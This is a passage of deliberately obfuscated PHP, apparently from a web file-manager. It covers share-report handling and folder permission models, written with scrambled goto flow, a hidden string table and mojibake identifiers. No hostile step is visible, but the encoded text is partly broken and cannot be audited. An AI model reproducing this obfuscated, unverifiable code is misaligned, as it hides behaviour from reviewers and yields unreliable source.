$BÆ ¹¸‘õ =& $_SERVER[¢ÌÛ]; $f’áÇ²º¤š = array(); if ($F¼´íñ³[$BÆ ¹¸‘õ[1498]]) { $f’áÇ²º¤š[$BÆ ¹¸‘õ[1498]] = $F¼´íñ³[$BÆ ¹¸‘õ[1498]]; } goto cÒ£ëªöÕ; Dä©ªãµƒ: $B’àÖø¢§· = $this->_makeOrder()->where($f’áÇ²º¤š)->selectPage(20); if (empty($B’àÖø¢§·[$BÆ ¹¸‘õ[363]])) { return array(); } $this->_listDataApply($B’àÖø¢§·[$BÆ ¹¸‘õ[363]]); goto E¿¢Š™Ÿ; E¿¢Š™Ÿ: return $B’àÖø¢§·; goto DÂêÅÇè‰‡; cÒ£ëªöÕ: if ($F¼´íñ³[$BÆ ¹¸‘õ[725]]) { $eØ¶‰ºÚ = $F¼´íñ³[$BÆ ¹¸‘õ[474]] ? $F¼´íñ³[$BÆ ¹¸‘õ[474]] : strtotime(date($BÆ ¹¸‘õ[1814])); $f’áÇ²º¤š[$BÆ ¹¸‘õ[192]] = array($BÆ ¹¸‘õ[329], array($F¼´íñ³[$BÆ ¹¸‘õ[725]], $eØ¶‰ºÚ)); } if ($F¼´íñ³[$BÆ ¹¸‘õ[29]]) { $f’áÇ²º¤š[$F¼´íñ³[$BÆ ¹¸‘õ[29]]] = 1; } else { $f’áÇ²º¤š[] = array($BÆ ¹¸‘õ[471] => array($BÆ ¹¸‘õ[946], 0), $BÆ ¹¸‘õ[473] => array($BÆ ¹¸‘õ[946], 0), $BÆ ¹¸‘õ[1789] => $BÆ ¹¸‘õ[1746]); } if ($F¼´íñ³[$BÆ ¹¸‘õ[1742]]) { $f’áÇ²º¤š[] = array($BÆ ¹¸‘õ[468] => $F¼´íñ³[$BÆ ¹¸‘õ[1742]], $BÆ ¹¸‘õ[1403] => array($BÆ ¹¸‘õ[375], "\45{$F¼´íñ³[$BÆ ¹¸‘õ[1742]]}\45"), $BÆ ¹¸‘õ[1789] => $BÆ ¹¸‘õ[1746]); } goto Dä©ªãµƒ; DÂêÅÇè‰‡: } public function listDataApply($bõáªƒ•²Ä) { $this->_listDataApply($bõáªƒ•²Ä); return $bõáªƒ•²Ä; } private function _listDataApply(&$b¾ƒ‡­Ä) { goto fİ‘¼ŒÊÎÏ; aŒÀŠŞÇŒÒ: $fŒƒİ¡ƒÍ = array_to_keyvalue($b¾ƒ‡­Ä, $e¬óöˆŒŸ[33], $e¬óöˆŒŸ[396]); $Bå‰ËÃÒÄ = Model($e¬óöˆŒŸ[774])->sourceListInfo($fŒƒİ¡ƒÍ, !0); foreach ($b¾ƒ‡­Ä as &$bôÉêå—Ú) { $CÖŞ‘Óµ‡˜ = $bôÉêå—Ú[$e¬óöˆŒŸ[1498]]; $bôÉêå—Ú[$e¬óöˆŒŸ[1815]] = $aÃĞ¾àÌÈ[$CÖŞ‘Óµ‡˜] ? $aÃĞ¾àÌÈ[$CÖŞ‘Óµ‡˜] : !1; $aÂ”‰¤İˆì = $bôÉêå—Ú[$e¬óöˆŒŸ[396]]; $bôÉêå—Ú[$e¬óöˆŒŸ[84]] = $Bå‰ËÃÒÄ[$aÂ”‰¤İˆì] ? $Bå‰ËÃÒÄ[$aÂ”‰¤İˆì] : !1; } goto DŠÅ¦¿‚ğô; DŠÅ¦¿‚ğô: unset($bôÉêå—Ú); goto bÊÇ­¡ÖÙã; fİ‘¼ŒÊÎÏ: $e¬óöˆŒŸ =& $_SERVER[¢ÌÛ]; $EòšÀ’š¤ = array_to_keyvalue($b¾ƒ‡­Ä, $e¬óöˆŒŸ[33], $e¬óöˆŒŸ[1498]); $aÃĞ¾àÌÈ = Model($e¬óöˆŒŸ[504])->userListInfo(array_unique($EòšÀ’š¤)); goto aŒÀŠŞÇŒÒ; bÊÇ­¡ÖÙã: } private function _makeOrder($b®Ì›ìÊ…§ = '') { goto aÖ½¡ÍÜ·; aÖ½¡ÍÜ·: $a°ëÑŒ±Ğ =& $_SERVER[¢ÌÛ]; $dŸ–ª—‰¯ñ = array($a°ëÑŒ±Ğ[192], $a°ëÑŒ±Ğ[474], $a°ëÑŒ±Ğ[1802], $a°ëÑŒ±Ğ[1803]); $FÂŠÉ¬ğ Ä = array($a°ëÑŒ±Ğ[428] => $a°ëÑŒ±Ğ[429], $a°ëÑŒ±Ğ[430] => $a°ëÑŒ±Ğ[431]); goto eùóìÓÓôé; eùóìÓÓôé: $FŸóñ¦±†ò = Input::get($a°ëÑŒ±Ğ[433], $a°ëÑŒ±Ğ[7], $a°ëÑŒ±Ğ[416], $dŸ–ª—‰¯ñ); $c¬Âç¦¹ï = Input::get($a°ëÑŒ±Ğ[434], $a°ëÑŒ±Ğ[7], $a°ëÑŒ±Ğ[1816], array($a°ëÑŒ±Ğ[1741], $a°ëÑŒ±Ğ[430])); $c¬Âç¦¹ï = $FÂŠÉ¬ğ Ä[$c¬Âç¦¹ï]; goto DÁ«¾Õ¯Ø¹; DÁ«¾Õ¯Ø¹: $b®Ì›ìÊ…§ = $b®Ì›ìÊ…§ . "{$FŸóñ¦±†ò}\x20{$c¬Âç¦¹ï}"; return $this->order($b®Ì›ìÊ…§); goto B„»…îŒÍ; B„»…îŒÍ: } public function reportAdd($Cš‡ÑÎ‹„) { $a­’ö¼÷¤„ =& $_SERVER[¢ÌÛ]; $A¼ó„òîÆ = array($a­’ö¼÷¤„[466] => $Cš‡ÑÎ‹„[$a­’ö¼÷¤„[466]], $a­’ö¼÷¤„[1498] => USER_ID); if (Model($a­’ö¼÷¤„[1812])->where($A¼ó„òîÆ)->find()) { return !1; } $aà™§Ó¦İš = array($a­’ö¼÷¤„[466] => $Cš‡ÑÎ‹„[$a­’ö¼÷¤„[466]], $a­’ö¼÷¤„[1403] => $Cš‡ÑÎ‹„[$a­’ö¼÷¤„[1403]], $a­’ö¼÷¤„[396] => $Cš‡ÑÎ‹„[$a­’ö¼÷¤„[396]], $a­’ö¼÷¤„[445] => $Cš‡ÑÎ‹„[$a­’ö¼÷¤„[445]], $a­’ö¼÷¤„[1498] => USER_ID, $a­’ö¼÷¤„[29] => $Cš‡ÑÎ‹„[$a­’ö¼÷¤„[29]], $a­’ö¼÷¤„[431] => $Cš‡ÑÎ‹„[$a­’ö¼÷¤„[431]]); return Model($a­’ö¼÷¤„[1812])->add($aà™§Ó¦İš); } public function reportList($aà°½ÏÓ÷í) { goto fÉ¬ö±¢ˆƒ; a¤½†Ñí¡: if (isset($aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[29]]) && in_array($aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[29]], array($d±Ç”‹Öõ¯[86], $d±Ç”‹Öõ¯[1817], $d±Ç”‹Öõ¯[1818], $d±Ç”‹Öõ¯[1819], $d±Ç”‹Öõ¯[1820]))) { $cåçÏ²Ğ×[$d±Ç”‹Öõ¯[29]] = $aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[29]]; } if (isset($aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[712]]) && in_array($aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[712]], array($d±Ç”‹Öõ¯[495], $d±Ç”‹Öõ¯[86], $d±Ç”‹Öõ¯[1817], $d±Ç”‹Öõ¯[1818]))) { $cåçÏ²Ğ×[$d±Ç”‹Öõ¯[712]] = $aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[712]]; } $cÈ¤ãÍ÷Šé = Input::get($d±Ç”‹Öõ¯[434], $d±Ç”‹Öõ¯[7], $d±Ç”‹Öõ¯[1816], array($d±Ç”‹Öõ¯[1741], $d±Ç”‹Öõ¯[430])); goto AïÉ Ïø…; fÉ¬ö±¢ˆƒ: $d±Ç”‹Öõ¯ =& $_SERVER[¢ÌÛ]; $cåçÏ²Ğ× = array(); if ($aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[725]]) { $fİÙƒÜÄš‹ = $aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[474]] ? $aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[474]] : strtotime(date($d±Ç”‹Öõ¯[1814])); $cåçÏ²Ğ×[$d±Ç”‹Öõ¯[192]] = array($d±Ç”‹Öõ¯[329], array($aà°½ÏÓ÷í[$d±Ç”‹Öõ¯[725]], $fİÙƒÜÄš‹)); } goto a¤½†Ñí¡; bœ’Ğóé½ã: if (empty($f¾™ĞÀâ•[$d±Ç”‹Öõ¯[363]])) { return array(); } $this->_listDataApply($f¾™ĞÀâ•[$d±Ç”‹Öõ¯[363]]); return $f¾™ĞÀâ•; goto b³½Äƒ¤£; AïÉ Ïø…: $b‘Ùïµ×øœ = array($d±Ç”‹Öõ¯[428] => $d±Ç”‹Öõ¯[429], $d±Ç”‹Öõ¯[430] => $d±Ç”‹Öõ¯[431]); $e—Ä×£ù…Ú = $d±Ç”‹Öõ¯[1821] . $b‘Ùïµ×øœ[$cÈ¤ãÍ÷Šé]; $f¾™ĞÀâ• = Model($d±Ç”‹Öõ¯[1812])->where($cåçÏ²Ğ×)->order($e—Ä×£ù…Ú)->selectPage(20); goto bœ’Ğóé½ã; b³½Äƒ¤£: } public function reportStatus($D¡²ë£—•) { goto C¶Š·Àˆ; FŒäÑİŞš: return $F÷¨„Ë•Èƒ; goto cÎ£ˆí©ñ; E×¿Ç·¬Çƒ: if (!$c½¯„¥¥¾) { return !1; } $eàğºĞ•Ô± = array($c±ø™ƒá²[712] => $D¡²ë£—•[$c±ø™ƒá²[712]]); if ($D¡²ë£—•[$c±ø™ƒá²[712]] == $c±ø™ƒá²[1818] && $c½¯„¥¥¾[$c±ø™ƒá²[712]] == $c±ø™ƒá²[1818]) { $eàğºĞ•Ô±[$c±ø™ƒá²[712]] = 0; } goto C­õŞ‘Æ’Ç; C¶Š·Àˆ: $c±ø™ƒá² =& $_SERVER[¢ÌÛ]; $bŠŠº¡…¥ = array($c±ø™ƒá²[385] => $D¡²ë£—•[$c±ø™ƒá²[385]]); $c½¯„¥¥¾ = Model($c±ø™ƒá²[1812])->where($bŠŠº¡…¥)->field($c±ø™ƒá²[1822])->find(); goto E×¿Ç·¬Çƒ; C­õŞ‘Æ’Ç: $F÷¨„Ë•Èƒ = Model($c±ø™ƒá²[1812])->where($bŠŠº¡…¥)->save($eàğºĞ•Ô±); if ($D¡²ë£—•[$c±ø™ƒá²[712]] == $c±ø™ƒá²[1817]) { if ($c½¯„¥¥¾[$c±ø™ƒá²[445]] != $c±ø™ƒá²[495] && $this->shareFileMeta($c½¯„¥¥¾[$c±ø™ƒá²[445]])) { $this->shareFileMeta($c½¯„¥¥¾[$c±ø™ƒá²[445]], 0); } $this->remove($c½¯„¥¥¾[$c±ø™ƒá²[466]]); return !0; } if ($F÷¨„Ë•Èƒ && $D¡²ë£—•[$c±ø™ƒá²[712]] == $c±ø™ƒá²[1818]) { $CØµ†¹ÂÓ = $eàğºĞ•Ô±[$c±ø™ƒá²[712]] == $c±ø™ƒá²[1818] ? 1 : 0; $this->shareFileMeta($c½¯„¥¥¾[$c±ø™ƒá²[445]], $CØµ†¹ÂÓ); $this->removeByFile($c½¯„¥¥¾[$c±ø™ƒá²[445]]); } goto FŒäÑİŞš; cÎ£ˆí©ñ: } private function removeByFile($eŞ¯ßØŒ) { goto FÏÎ»È¡¢À; FÏÎ»È¡¢À: $Eáç‘¡Ùªø =& $_SERVER[¢ÌÛ]; $f¦¦ß¾îÅÁ = Model($Eáç‘¡Ùªø[774])->where(array($Eáç‘¡Ùªø[445] => $eŞ¯ßØŒ))->field($Eáç‘¡Ùªø[396])->select(); $Fç—½¿³©× = array_to_keyvalue($f¦¦ß¾îÅÁ, $Eáç‘¡Ùªø[33], $Eáç‘¡Ùªø[396]); goto dôéé´®„Œ; BİÒÄÚôˆ: $C´æ´‹íÀ° = array_to_keyvalue($f¦¦ß¾îÅÁ, $Eáç‘¡Ùªø[33], $Eáç‘¡Ùªø[466]); $this->remove($C´æ´‹íÀ°); goto cÑŒ•‹Ëñ; dôéé´®„Œ: $bù¬Ş»§ĞÖ = array($Eáç‘¡Ùªø[396] => array($Eáç‘¡Ùªø[7], $Fç—½¿³©×), $Eáç‘¡Ùªø[471] => 1); $f¦¦ß¾îÅÁ = Model($Eáç‘¡Ùªø[1634])->where($bù¬Ş»§ĞÖ)->field($Eáç‘¡Ùªø[466])->select(); if (empty($f¦¦ß¾îÅÁ)) { return; } goto BİÒÄÚôˆ; cÑŒ•‹Ëñ: } private function shareFileMeta($CÚ…ÁŒ™¼¸, $EÆ“¶§‡§„ = null) { $fÍ©ÈÕ²ªî =& $_SERVER[¢ÌÛ]; $C×ò¾Ğ’¶ = array($fÍ©ÈÕ²ªî[445] => $CÚ…ÁŒ™¼¸, $fÍ©ÈÕ²ªî[92] => $fÍ©ÈÕ²ªî[1823]); if (is_null($EÆ“¶§‡§„)) { return Model($fÍ©ÈÕ²ªî[1824])->where($C×ò¾Ğ’¶)->find(); } $C×ò¾Ğ’¶[$fÍ©ÈÕ²ªî[368]] = $EÆ“¶§‡§„; Model($fÍ©ÈÕ²ªî[1824])->add($C×ò¾Ğ’¶, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\143\x65\x5f\x61\165\164\x68"; public function getAuth($eùÆ·ÓÌˆç) { goto EÍ·§îí; EÍ·§îí: $CÄÉ‘Ñßàô =& $_SERVER[¢ÌÛ]; $CÉó¹ãÅ = $this->sourceAuthSelect($eùÆ·ÓÌˆç); $AøŞÜÜ£ë¤ = array(); goto cÏ‡­äÁ‰Ú; cÏ‡­äÁ‰Ú: $E¾Ä…èÜ­÷ = array(); $cåƒÊ‹à Ç = 2 << 25; foreach ($CÉó¹ãÅ as $B—ºñÔÊÈó) { goto EÈö­­Ë”; EÈö­­Ë”: $FùƒÛˆÊ»Â = Model($CÄÉ‘Ñßàô[1825])->listData($B—ºñÔÊÈó[$CÄÉ‘Ñßàô[1806]]); if (!$FùƒÛˆÊ»Â) { continue; } $AøŞÜÜ£ë¤[] = $B—ºñÔÊÈó; goto E—ß…Æñø§; AÍ‡‘š¢Œ: if ($B—ºñÔÊÈó[$CÄÉ‘Ñßàô[398]] == SourceModel::TYPE_USER && $B—ºñÔÊÈó[$CÄÉ‘Ñßàô[483]] == $CÄÉ‘Ñßàô[495]) { $aˆÔ±ø»ÎÉ = 0; } $E¾Ä…èÜ­÷[] = $FùƒÛˆÊ»Â[$CÄÉ‘Ñßàô[403]] + $aˆÔ±ø»ÎÉ; goto a£‹ àö§ï; E—ß…Æñø§: $aˆÔ±ø»ÎÉ = 0; if ($B—ºñÔÊÈó[$CÄÉ‘Ñßàô[398]] == SourceModel::TYPE_GROUP) { $aˆÔ±ø»ÎÉ = $cåƒÊ‹à Ç * 2; } if ($B—ºñÔÊÈó[$CÄÉ‘Ñßàô[398]] == SourceModel::TYPE_USER) { $aˆÔ±ø»ÎÉ = $cåƒÊ‹à Ç; } goto AÍ‡‘š¢Œ; a£‹ àö§ï: } goto Bå‚ˆÓ äØ; Bå‚ˆÓ äØ: array_multisort($E¾Ä…èÜ­÷, SORT_DESC, $AøŞÜÜ£ë¤); return $AøŞÜÜ£ë¤; goto d×¡„­’ĞÎ; d×¡„­’ĞÎ: } public function sourceAuthSelect($b´˜·º›Ú) { goto FÁ‚ÄÂ¯…‡; e¿¢Ãî‘´: if ($b‰ˆ‡–Óçé) { return $EÒÅŒç‘¬Í; } return $A„òÂĞä„à; goto b²âëÀ¤ö; FÁ‚ÄÂ¯…‡: $dùê‹ñÌØë =& $_SERVER[¢ÌÛ]; static $Fˆä½Î—£° = array(); $b‰ˆ‡–Óçé = is_array($b´˜·º›Ú) ? !1 : !0; goto aÃ¯ôÏÃÚ; Cò•İ—˜¡: $EÒÅŒç‘¬Í = $this->field($a›èÀÃÌğ)->order($dùê‹ñÌØë[385])->where($eğ¥çÛÄÆ›)->select(); $A„òÂĞä„à = array_to_keyvalue_group($EÒÅŒç‘¬Í, $dùê‹ñÌØë[396]); foreach ($b´˜·º›Ú as $eôæ“·Ü…’) { $Fˆä½Î—£°[$eôæ“·Ü…’] = $A„òÂĞä„à[$eôæ“·Ü…’] ? $A„òÂĞä„à[$eôæ“·Ü…’] : array(); } goto e¿¢Ãî‘´; F‡…‹ÇïÈ¾: if (count($BƒÂëøôç) == count($b´˜·º›Ú)) { return $b‰ˆ‡–Óçé ? $BƒÂëøôç[$b´˜·º›Ú[0]] : $BƒÂëøôç; } $a›èÀÃÌğ = $dùê‹ñÌØë[1826]; $eğ¥çÛÄÆ› = array($dùê‹ñÌØë[396] => array($dùê‹ñÌØë[7], $b´˜·º›Ú)); goto Cò•İ—˜¡; aÃ¯ôÏÃÚ: if ($b‰ˆ‡–Óçé) { $b´˜·º›Ú = array($b´˜·º›Ú); } $BƒÂëøôç = array(); foreach ($b´˜·º›Ú as $eôæ“·Ü…’) { if (isset($Fˆä½Î—£°[$eôæ“·Ü…’])) { $BƒÂëøôç[$eôæ“·Ü…’] = $Fˆä½Î—£°[$eôæ“·Ü…’]; } } goto F‡…‹ÇïÈ¾; b²âëÀ¤ö: } public function setAuth($fßƒÙ¡ÛĞ, $e¡»È–’´¿) { goto BŠÑŞˆ‘ß; d½®Ÿéèä: if ($fòØÊŒ„×[$fÍ‹Ê•ãÍê[398]] != SourceModel::TYPE_GROUP) { return !1; } $BÉÛ„¡ƒÛœ = 1; $Dó’Ñ× Å¼ = $fòØÊŒ„×[$fÍ‹Ê•ãÍê[483]]; goto A‰©º®Ö¿ñ; b‘À‚ÀÑÄ®: return !0; goto CøˆØ³éÖ‹; A‰©º®Ö¿ñ: if ($Dó’Ñ× Å¼ != $BÉÛ„¡ƒÛœ) { $d˜®¤¹Ú = array($fÍ‹Ê•ãÍê[1657] => $Dó’Ñ× Å¼); $FÇİ´éÁ  = Model($fÍ‹Ê•ãÍê[1740])->field($fÍ‹Ê•ãÍê[1498])->where($d˜®¤¹Ú)->select(); $FÇİ´éÁ  = array_to_keyvalue($FÇİ´éÁ , $fÍ‹Ê•ãÍê[33], $fÍ‹Ê•ãÍê[1498]); } $Côë¤ˆ¨À° = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $eÑÁæÜª«Î = array(); goto b»®ˆÏèöî; BŠÑŞˆ‘ß: $fÍ‹Ê•ãÍê =& $_SERVER[¢ÌÛ]; $fòØÊŒ„× = Model($fÍ‹Ê•ãÍê[1178])->sourceInfo($fßƒÙ¡ÛĞ); if (!$fòØÊŒ„×) { return !1; } goto d½®Ÿéèä; b»®ˆÏèöî: foreach ($e¡»È–’´¿ as $dŸ•ÍÙóÏ) { if (!in_array($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[398]], $Côë¤ˆ¨À°)) { show_json(LNG($fÍ‹Ê•ãÍê[1827]), !1); } if ($Dó’Ñ× Å¼ != $BÉÛ„¡ƒÛœ) { if ($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[398]] == SourceModel::TYPE_GROUP) { } if ($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[483]] != 0 && !in_array($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[483]], $FÇİ´éÁ )) { } } if ($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[483]] == 0) { $dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[398]] = SourceModel::TYPE_USER; } $eÑÁæÜª«Î[] = array($fÍ‹Ê•ãÍê[396] => $fßƒÙ¡ÛĞ, $fÍ‹Ê•ãÍê[398] => intval($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[398]]), $fÍ‹Ê•ãÍê[483] => intval($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[483]]), $fÍ‹Ê•ãÍê[1806] => intval($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[1806]]) ? intval($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[1806]]) : 0, $fÍ‹Ê•ãÍê[1807] => intval($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[1807]]) ? intval($dŸ•ÍÙóÏ[$fÍ‹Ê•ãÍê[1807]]) : -1); } $this->where(array($fÍ‹Ê•ãÍê[410] => $fßƒÙ¡ÛĞ))->delete(); $this->addAll($eÑÁæÜª«Î); goto b‘À‚ÀÑÄ®; CøˆØ³éÖ‹: } public function authClear($FÏğãñŞãø) { $EÕ”Ÿ—„¡» =& $_SERVER[¢ÌÛ]; $fƒŒõñ»¨£ = Model($EÕ”Ÿ—„¡»[1178])->sourceInfo($FÏğãñŞãø); $f¦ò¶Şßã = array($FÏğãñŞãø); if ($fƒŒõñ»¨£[$EÕ”Ÿ—„¡»[397]] == $EÕ”Ÿ—„¡»[86]) { $eî²’‚ÖÎ = array($EÕ”Ÿ—„¡»[551] => array($EÕ”Ÿ—„¡»[510], $fƒŒõñ»¨£[$EÕ”Ÿ—„¡»[486]] . $FÏğãñŞãø . $EÕ”Ÿ—„¡»[511])); $f¦ò¶Şßã = Model($EÕ”Ÿ—„¡»[1178])->field($EÕ”Ÿ—„¡»[410])->where($eî²’‚ÖÎ)->getField($EÕ”Ÿ—„¡»[396], !0); $f¦ò¶Şßã[] = $FÏğãñŞãø; } $this->where(array($EÕ”Ÿ—„¡»[410] => array($EÕ”Ÿ—„¡»[411], $f¦ò¶Şßã)))->delete(); return !0; } public function getAllChildren($açÅå°¡·ù) { goto F‰ù ƒˆ; AĞŸöË‘˜: if (!$b…ˆâˆ›ÎÅ) { return array(); } $B¾›ïªİ–µ = $aâÓ “×÷±[1828]; $c–×ßÙñ¨† = array($aâÓ “×÷±[396] => array($aâÓ “×÷±[7], $b…ˆâˆ›ÎÅ), $aâÓ “×÷±[423] => $aâÓ “×÷±[495]); goto eñ¢¬çÈÉ; eã‡”‹Š«÷: if ($Dâß¼ÌÀãŠ[$aâÓ “×÷±[398]] != SourceModel::TYPE_GROUP) { return array(); } $F‡ÖÆç = 1; $cšÇì±Ü = array($açÅå°¡·ù); goto fÊ‡ê‹Ş…Ğ; eñ¢¬çÈÉ: $EËÕó•«¶ = Model($aâÓ “×÷±[774])->field($B¾›ïªİ–µ)->where($c–×ßÙñ¨†)->select(); $cÆ§²±ÕÕò = array($açÅå°¡·ù); foreach ($EËÕó•«¶ as $a£ñÕ¯¬Í¿) { foreach ($cšÇì±Ü as $EÙ§’‰ÏÅï) { $D¸§¾œ »© = $aâÓ “×÷±[47] . $EÙ§’‰ÏÅï . $aâÓ “×÷±[47]; $eâ‹¼òäÑ = $a£ñÕ¯¬Í¿[$aâÓ “×÷±[486]] . $a£ñÕ¯¬Í¿[$aâÓ “×÷±[396]] . $aâÓ “×÷±[47]; if (strstr($eâ‹¼òäÑ, $D¸§¾œ »©)) { $cÆ§²±ÕÕò[] = $a£ñÕ¯¬Í¿[$aâÓ “×÷±[396]]; break; } } } goto b•„‰åëæŠ; b•„‰åëæŠ: return $this->sourceListAuth($cÆ§²±ÕÕò); goto Aá³Òˆ‚ÍÎ; F‰ù ƒˆ: $aâÓ “×÷± =& $_SERVER[¢ÌÛ]; $Dâß¼ÌÀãŠ = Model($aâÓ “×÷±[1178])->sourceInfo($açÅå°¡·ù); if ($Dâß¼ÌÀãŠ[$aâÓ “×÷±[397]] != $aâÓ “×÷±[86]) { return $this->sourceListAuth(array($açÅå°¡·ù)); } goto eã‡”‹Š«÷; fÊ‡ê‹Ş…Ğ: if ($Dâß¼ÌÀãŠ[$aâÓ “×÷±[488]] == $aâÓ “×÷±[495] && $Dâß¼ÌÀãŠ[$aâÓ “×÷±[483]] != $F‡ÖÆç) { $cšÇì±Ü = $this->groupChidldAllRootSource($Dâß¼ÌÀãŠ[$aâÓ “×÷±[483]]); } $b…ˆâˆ›ÎÅ = $this->field($aâÓ “×÷±[396])->group($aâÓ “×÷±[396])->select(); $b…ˆâˆ›ÎÅ = array_to_keyvalue($b…ˆâˆ›ÎÅ, $aâÓ “×÷±[33], $aâÓ “×÷±[396]); goto AĞŸöË‘˜; Aá³Òˆ‚ÍÎ: } private function sourceListAuth($aÚÓ²øñõÍ) { goto bˆ„£ôÅ; c®­²¾ Ñ¨: $a»‚‘¥ìòÕ = array(); $D…×‹ÃÍ¿® = array(); foreach ($fØ±‰Ì¡‹¶ as $dÃ°ºˆöÑœ) { goto CÀÇ±È‡; dä‡¿¸‘ê: $dÃ°ºˆöÑœ[$D† °«Ø˜‚[1829]] = $this->authTargetInfo($cçÎÅÚåáº); $dÃ°ºˆöÑœ[$D† °«Ø˜‚[493]] = rtrim($dÃ°ºˆöÑœ[$D† °«Ø˜‚[489]], $D† °«Ø˜‚[8]) . $D† °«Ø˜‚[8] . ltrim($dÃ°ºˆöÑœ[$D† °«Ø˜‚[493]], $D† °«Ø˜‚[8]); $a»‚‘¥ìòÕ[] = $dÃ°ºˆöÑœ; goto Eª¸§‘­»‚; cì‚ò—¨œš: unset($dÃ°ºˆöÑœ[$D† °«Ø˜‚[84]]); $cçÎÅÚåáº = $D©¤Ä°ñ[$dÃ°ºˆöÑœ[$D† °«Ø˜‚[396]]]; if (!$cçÎÅÚåáº) { continue; } goto dä‡¿¸‘ê; Eª¸§‘­»‚: $cŠÂÔŠéïî = count(explode($D† °«Ø˜‚[8], trim($dÃ°ºˆöÑœ[$D† °«Ø˜‚[493]], $D† °«Ø˜‚[8]))); $D…×‹ÃÍ¿®[] = $cŠÂÔŠéïî + ($dÃ°ºˆöÑœ[$D† °«Ø˜‚[29]] == $D† °«Ø˜‚[76] ? 0 : 1000); goto cê—Ç„…Œ; CÀÇ±È‡: unset($dÃ°ºˆöÑœ[$D† °«Ø˜‚[406]]); unset($dÃ°ºˆöÑœ[$D† °«Ø˜‚[405]]); unset($dÃ°ºˆöÑœ[$D† °«Ø˜‚[403]]); goto cì‚ò—¨œš; cê—Ç„…Œ: } goto f«š©ª½„; f«š©ª½„: array_multisort($D…×‹ÃÍ¿®, SORT_ASC, $a»‚‘¥ìòÕ); return $a»‚‘¥ìòÕ; goto cö˜ò¸‡; bˆ„£ôÅ: $D† °«Ø˜‚ =& $_SERVER[¢ÌÛ]; $fØ±‰Ì¡‹¶ = Model($D† °«Ø˜‚[1178])->sourceListInfo($aÚÓ²øñõÍ, !0); $D©¤Ä°ñ = $this->sourceAuthSelect($aÚÓ²øñõÍ); goto c®­²¾ Ñ¨; cö˜ò¸‡: } private function groupChidldAllRootSource($eŸ¼¢è¾¨) { $CØÏë¼®„ =& $_SERVER[¢ÌÛ]; $DÏ‹ÔÁ«§¹ = Model($CØÏë¼®„[1830])->groupChildrenAll($eŸ¼¢è¾¨); $FåÍÁ®Í¹„ = array($CØÏë¼®„[488] => 0, $CØÏë¼®„[483] => array($CØÏë¼®„[7], $DÏ‹ÔÁ«§¹), $CØÏë¼®„[398] => SourceModel::TYPE_GROUP); $CØª´ÔŠ = Model($CØÏë¼®„[774])->field($CØÏë¼®„[396])->where($FåÍÁ®Í¹„)->select(); $CØª´ÔŠ = array_to_keyvalue($CØª´ÔŠ, $CØÏë¼®„[33], $CØÏë¼®„[396]); return $CØª´ÔŠ; } private function authTargetInfo($ašõ×¡ºèØ) { goto e„•‹³¡÷å; e„•‹³¡÷å: $Déáï‰ÛŒŸ =& $_SERVER[¢ÌÛ]; $aÙÏíÇĞ = array(); $a¦Ê†Â‹Û½ = array(); goto Dš£¶ÒÖ¿Ÿ; d³ƒ’èÏÓ¨: return $aÙÏíÇĞ; goto fßˆ‘ï»Ÿ™; Dš£¶ÒÖ¿Ÿ: $bö¯©Ÿ°… = 2 << 25; foreach ($ašõ×¡ºèØ as $D©«É‰óÇ) { goto Dô» „”; Dô» „”: $BßÇÙ³¿Æ¡ = Model($Déáï‰ÛŒŸ[1825])->listData($D©«É‰óÇ[$Déáï‰ÛŒŸ[1806]]); if (!$BßÇÙ³¿Æ¡) { continue; } if ($D©«É‰óÇ[$Déáï‰ÛŒŸ[398]] == SourceModel::TYPE_USER) { $AÇÄÒ²Òæ = Model($Déáï‰ÛŒŸ[501])->getInfoSimpleOuter($D©«É‰óÇ[$Déáï‰ÛŒŸ[483]]); if ($AÇÄÒ²Òæ[$Déáï‰ÛŒŸ[1498]] == $Déáï‰ÛŒŸ[1061]) { continue; } if ($AÇÄÒ²Òæ[$Déáï‰ÛŒŸ[1498]] == $Déáï‰ÛŒŸ[495]) { $AÇÄÒ²Òæ[$Déáï‰ÛŒŸ[28]] = LNG($Déáï‰ÛŒŸ[1831]); } } else { $AÇÄÒ²Òæ = Model($Déáï‰ÛŒŸ[485])->getInfoSimple($D©«É‰óÇ[$Déáï‰ÛŒŸ[483]]); } goto FŸå¿„ŠÕ; e©Œ‘±¿ñ: if ($D©«É‰óÇ[$Déáï‰ÛŒŸ[398]] == SourceModel::TYPE_USER && $D©«É‰óÇ[$Déáï‰ÛŒŸ[483]] == $Déáï‰ÛŒŸ[495]) { $CÉˆÒò‹Ã = 0; } $a¦Ê†Â‹Û½[] = $BßÇÙ³¿Æ¡[$Déáï‰ÛŒŸ[403]] + $CÉˆÒò‹Ã; goto CôÙ¿¹ïØ§; Aˆù‰ÅŞ¢ï: $CÉˆÒò‹Ã = 0; if ($D©«É‰óÇ[$Déáï‰ÛŒŸ[398]] == SourceModel::TYPE_GROUP) { $CÉˆÒò‹Ã = $bö¯©Ÿ°… * 2; } if ($D©«É‰óÇ[$Déáï‰ÛŒŸ[398]] == SourceModel::TYPE_USER) { $CÉˆÒò‹Ã = $bö¯©Ÿ°…; } goto e©Œ‘±¿ñ; FŸå¿„ŠÕ: if (!$AÇÄÒ²Òæ) { continue; } $AÇÄÒ²Òæ[$Déáï‰ÛŒŸ[444]] = $BßÇÙ³¿Æ¡; $aÙÏíÇĞ[] = $AÇÄÒ²Òæ; goto Aˆù‰ÅŞ¢ï; 